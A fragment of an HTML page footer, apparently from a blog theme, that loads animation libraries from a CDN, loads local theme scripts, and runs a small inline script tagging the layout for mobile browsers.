src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
